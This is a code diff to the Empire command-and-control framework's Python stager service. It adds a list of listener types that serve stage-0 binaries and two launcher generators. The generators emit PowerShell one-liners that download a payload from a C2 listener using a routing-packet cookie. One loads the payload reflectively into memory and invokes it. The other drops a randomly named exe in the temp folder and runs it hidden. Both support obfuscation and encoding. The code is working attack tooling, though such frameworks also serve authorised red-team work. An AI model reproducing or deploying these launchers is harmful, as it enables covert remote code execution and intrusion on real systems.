@@ -18,6 +18,7 @@ from sqlalchemy import select
 from empire.server.common import helpers, packets
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
+from empire.server.core.exceptions import ModuleValidationException
 from empire.server.utils import data_util
 from empire.server.utils.donut_util import donut_create
 
@@ -27,6 +28,22 @@ if typing.TYPE_CHECKING:
 log = logging.getLogger(__name__)
 
 _ARCH_MAP = {"x86": 1, "x64": 2, "both": 3}
+
+# Listener types that serve a C# / IronPython / Go stage-0 binary on a
+# stager URI. This is the single source of truth for the routed
+# generate_exe_oneliner / generate_go_exe_oneliner helpers — the per-site
+# allow-list that used to live in 13 stager/module files (sweep landed in
+# this PR) is consolidated here. Listeners outside this set (HTTP[S] Hop,
+# Template, future types) silently produce a syntactically-valid but
+# functionally-broken launcher if allowed through; raise instead.
+_STAGE0_SERVING_LISTENERS = frozenset(
+    {
+        "HTTP[S]",
+        "HTTP[S] MALLEABLE",
+        "smb_pivot",
+        "port_forward_pivot",
+    }
+)
 
 
 def _resolve_arch(arch: str) -> int:
@@ -320,6 +337,147 @@ class StagerGenerationService:
         if hop:
             return f"{base}?hop={hop}"
         return base
+
+    def _stage0_url_for(self, listener, hop: str) -> str:
+        """Listener-aware stage 0 URL picker. Malleable listeners serve
+        the SharpireMalleable / Gopire binary at a stager-specific URI
+        that DefaultProfile does NOT carry (DefaultProfile is populated
+        from profile.post.client.stringify()) — defer to the listener's
+        own stager_url() instead. Legacy listeners keep the original
+        DefaultProfile + _build_stage0_url path unchanged.
+
+        Raises ModuleValidationException for listener types that cannot
+        actually serve a csharp/go binary on stage 0 (HTTP[S] Hop, Template,
+        future types) — the per-site allow-list this PR removed used to
+        emit the same error from every call site; consolidated here.
+
+        Note: `hop` is honored only on the legacy DefaultProfile branch.
+        Malleable does not currently implement pivoted stage 0 (see
+        http_malleable.py — search for "TODO: handle this with malleable"),
+        so the hop arg is intentionally dropped on the malleable branch.
+        """
+        name = listener.info["Name"]
+        if name not in _STAGE0_SERVING_LISTENERS:
+            raise ModuleValidationException(
+                f"Listener type {name!r} does not serve a stage 0 binary; "
+                f"C# / IronPython / Go stagers require one of: "
+                f"{sorted(_STAGE0_SERVING_LISTENERS)}."
+            )
+        if hasattr(listener, "stager_url"):
+            return listener.stager_url()
+        request_uri = self._get_request_uri(listener)
+        return self._build_stage0_url(listener.host_address, request_uri, hop)
+
+    def generate_exe_oneliner_routed(
+        self, language, obfuscate, obfuscation_command, encode, listener_name
+    ):
+        """Listener-aware wrapper around generate_exe_oneliner. Picks the
+        correct stage 0 URL via _stage0_url_for so malleable listeners
+        get their stager URI; otherwise produces the exact same oneliner
+        shape as generate_exe_oneliner.
+        """
+        listener = self.listener_service.get_active_listener_by_name(listener_name)
+
+        if getattr(listener, "parent_listener", None) is not None:
+            hop = listener.options["Name"]["Value"]
+            while getattr(listener, "parent_listener", None) is not None:
+                listener = self.listener_service.get_active_listener_by_name(
+                    listener.parent_listener_name
+                )
+        else:
+            hop = ""
+
+        launcher_front = listener.options["Launcher"]["Value"]
+        staging_key = listener.options["StagingKey"]["Value"]
+        cookie_name = listener.options["Cookie"]["Value"]
+        routing_packet = packets.build_routing_packet(
+            staging_key,
+            sessionID="00000000",
+            language=language.upper(),
+            meta="STAGE0",
+            additional="None",
+            encData="",
+        )
+        b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
+        stage0_url = self._stage0_url_for(listener, hop)
+
+        launcher = f"""
+        $wc=New-Object System.Net.WebClient;
+        $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
+        $bytes=$wc.DownloadData("{stage0_url}");
+        $assembly=[Reflection.Assembly]::load($bytes);
+        $assembly.EntryPoint.Invoke($null,$null);
+        """
+
+        launcher = helpers.strip_powershell_comments(launcher)
+        launcher = data_util.ps_convert_to_oneliner(launcher)
+
+        if obfuscate:
+            launcher = self.obfuscation_service.obfuscate(
+                launcher,
+                obfuscation_command=obfuscation_command,
+            )
+        if encode and (
+            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+        ):
+            return helpers.powershell_launcher(launcher, launcher_front)
+        return launcher
+
+    def generate_go_exe_oneliner_routed(
+        self, language, listener_name, obfuscate, obfuscation_command, encode
+    ):
+        """Go mirror of generate_exe_oneliner_routed. Same listener-aware
+        URL pick, same oneliner shape as generate_go_exe_oneliner."""
+        listener = self.listener_service.get_active_listener_by_name(listener_name)
+
+        if getattr(listener, "parent_listener", None) is not None:
+            hop = listener.options["Name"]["Value"]
+            while getattr(listener, "parent_listener", None) is not None:
+                listener = self.listener_service.get_active_listener_by_name(
+                    listener.parent_listener.name
+                )
+        else:
+            hop = ""
+
+        launcher_front = listener.options["Launcher"]["Value"]
+        staging_key = listener.options["StagingKey"]["Value"]
+        cookie_name = listener.options["Cookie"]["Value"]
+        routing_packet = packets.build_routing_packet(
+            staging_key,
+            sessionID="00000000",
+            language=language.upper(),
+            meta="STAGE0",
+            additional="None",
+            encData="",
+        )
+        b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
+        stage0_url = self._stage0_url_for(listener, hop)
+
+        launcher = f"""
+            # Create a temp file path
+            $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
+            $wc = New-Object System.Net.WebClient;
+            $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
+            $url = "{stage0_url}";
+            $wc.DownloadFile($url, $tempFilePath);
+            Start-Process -FilePath $tempFilePath -WindowStyle Hidden;
+        """
+
+        launcher = helpers.strip_powershell_comments(launcher)
+        launcher = data_util.ps_convert_to_oneliner(launcher)
+
+        if obfuscate:
+            launcher = self.obfuscation_service.obfuscate(
+                launcher,
+                obfuscation_command=obfuscation_command,
+            )
+
+        if encode and (
+            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+        ):
+            return helpers.powershell_launcher(launcher, launcher_front)
+
+        return launcher
 
     def generate_python_exe(
         self, python_code, dot_net_version="net40", obfuscate=False
